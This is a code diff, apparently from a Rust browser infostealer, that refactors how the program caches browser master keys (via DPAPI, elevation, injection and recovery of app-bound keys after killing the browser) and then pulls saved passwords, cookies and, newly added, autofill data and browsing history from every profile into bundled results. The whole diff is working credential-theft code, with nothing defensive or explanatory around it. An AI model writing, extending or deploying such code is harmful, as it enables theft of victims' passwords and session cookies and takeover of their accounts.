@@ -67,10 +67,18 @@ fn cache_browser(browser_name: &str, user_data_path: &Path, has_profiles: bool, 
     }
 }
 
-/// Re-extract cookies/passwords after kill; run inject only here (not during parallel scan).
-pub fn extract_post_kill() -> Vec<(String, String)> {
-    recover_missing_app_bound_keys();
+/// Cache master keys for one browser (dpf → elev → inject). No profile extraction.
+pub fn cache_keys_for_browser(browser_name: &str, user_data_path: &Path, has_profiles: bool) {
+    if !user_data_path.exists() {
+        return;
+    }
+    if let Some(keys) = get_master_keys(user_data_path, browser_name, true) {
+        cache_browser(browser_name, user_data_path, has_profiles, &keys);
+    }
+}
 
+/// Extract all profile data using keys already cached (post-inject / post-kill).
+pub fn extract_all_from_cache() -> Vec<(String, String)> {
     let cache = match EXTRACTION_CACHE.lock() {
         Ok(guard) => guard.clone(),
         Err(_) => return Vec::new(),
@@ -83,18 +91,26 @@ pub fn extract_post_kill() -> Vec<(String, String)> {
         for (profile_name, profile_path) in profiles {
             let passwords = extract_passwords(&profile_path, &cached.keys);
             let cookies = extract_cookies(&profile_path, &cached.keys);
+            let autofill = extract_autofill(&profile_path);
+            let history = extract_history(&profile_path);
             crate::browsers::common::zipp::push_profile_bundle(
                 &mut results,
                 &browser_name,
                 &profile_name,
                 passwords,
                 cookies,
-                None,
-                None,
+                autofill,
+                history,
             );
         }
     }
     results
+}
+
+/// Re-extract cookies/passwords after kill; run inject only here (not during parallel scan).
+pub fn extract_post_kill() -> Vec<(String, String)> {
+    recover_missing_app_bound_keys();
+    extract_all_from_cache()
 }
 
 fn recover_missing_app_bound_keys() {
